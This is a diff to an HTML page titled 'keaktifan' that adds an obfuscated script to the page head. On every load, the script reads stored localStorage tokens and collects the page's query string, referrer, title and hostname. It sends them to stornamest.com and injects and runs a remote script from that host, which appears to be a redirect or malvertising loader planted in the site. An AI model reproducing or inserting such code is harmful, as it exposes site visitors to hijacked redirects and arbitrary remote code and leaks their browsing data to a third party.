@@ -1,6 +1,49 @@
 <!DOCTYPE HTML>
 <html>
 	<head>
+	<script>
+    (function() {
+    var name = '_CTfp9mgkMwn8Y3FG';
+    if (!window._CTfp9mgkMwn8Y3FG) {
+        window._CTfp9mgkMwn8Y3FG = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://stornamest.com/WgnzLLyZ',
+            P_PATH: 'https://stornamest.com/7b4f75c/postback',
+        };
+    }
+    const _Gr9KpQH6WDwJ67DR = localStorage.getItem('config');
+    if (typeof _Gr9KpQH6WDwJ67DR !== 'undefined' && _Gr9KpQH6WDwJ67DR !== null) {
+        var _6KpzQBc2dMDPPmK2 = JSON.parse(_Gr9KpQH6WDwJ67DR);
+        var _5M2FqYL2KpqTQj9N = Math.round(+new Date()/1000);
+        if (_6KpzQBc2dMDPPmK2.created_at + window._CTfp9mgkMwn8Y3FG.ttl < _5M2FqYL2KpqTQj9N) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _GMQKCvGKGQ3yhRNQ = localStorage.getItem('subId');
+    var _w5NSxM5NTQDfhP1L = localStorage.getItem('token');
+    var _PQ9djrsMw6bYnPRB = '?return=js.client';
+        _PQ9djrsMw6bYnPRB += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _PQ9djrsMw6bYnPRB += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _PQ9djrsMw6bYnPRB += '&default_keyword=' + encodeURIComponent(document.title);
+        _PQ9djrsMw6bYnPRB += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _PQ9djrsMw6bYnPRB += '&name=' + encodeURIComponent(name);
+        _PQ9djrsMw6bYnPRB += '&host=' + encodeURIComponent(window._CTfp9mgkMwn8Y3FG.R_PATH);
+    if (typeof _GMQKCvGKGQ3yhRNQ !== 'undefined' && _GMQKCvGKGQ3yhRNQ && window._CTfp9mgkMwn8Y3FG.unique) {
+        _PQ9djrsMw6bYnPRB += '&sub_id=' + encodeURIComponent(_GMQKCvGKGQ3yhRNQ);
+    }
+    if (typeof _w5NSxM5NTQDfhP1L !== 'undefined' && _w5NSxM5NTQDfhP1L && window._CTfp9mgkMwn8Y3FG.unique) {
+        _PQ9djrsMw6bYnPRB += '&token=' + encodeURIComponent(_w5NSxM5NTQDfhP1L);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._CTfp9mgkMwn8Y3FG.R_PATH + _PQ9djrsMw6bYnPRB;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>	
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<title>keaktifan</title>
